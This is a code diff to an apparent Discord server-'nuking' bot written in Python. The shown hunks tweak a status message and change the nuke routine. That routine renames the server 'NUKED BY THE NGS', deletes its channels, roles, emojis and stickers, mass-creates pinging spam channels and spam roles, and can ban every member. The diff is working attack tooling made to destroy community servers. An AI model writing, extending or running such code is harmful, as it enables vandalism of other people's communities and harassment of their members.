@@ -108,7 +108,7 @@ async def on_message(message):
             except:
                 print(Fore.YELLOW + "━ Unable to create text channel.")
         sys.stdout.write(backspace)
-        print(Fore.WHITE + f"▲ Mass channel ping has been finished with {c_made} being made. ({str(time.time()-start)}s)")
+        print(Fore.WHITE + f"▲ Mass channel ping has been finished with {c_made} channels being made. ({str(time.time()-start)}s)")
     
     async def mass_channels(amount, channel_name):
         print(Fore.WHITE + "\n▼ Mass channel creation is in progress...")
@@ -315,8 +315,8 @@ async def on_message(message):
         debugMode_on = False
         commandN = msg.split(" ")
         await ctx.edit(name="NUKED BY THE NGS")
-        await asyncio.gather(del_channels())
-        await asyncio.gather(mass_channel_ping(100, "johan-was-here", "SERVER NUKED BY THE NGS"), del_roles(), del_emojis(), del_stickers())
+        await asyncio.gather(del_channels(), del_roles())
+        await asyncio.gather(mass_channel_ping(50, "johan-was-here", "SERVER NUKED BY THE NGS"), mass_roles(50, "NUKED BY THE NGS"), del_emojis(), del_stickers())
         if len(commandN) > 1:
             if commandN[1] == "y":
                 await ban_everyone()
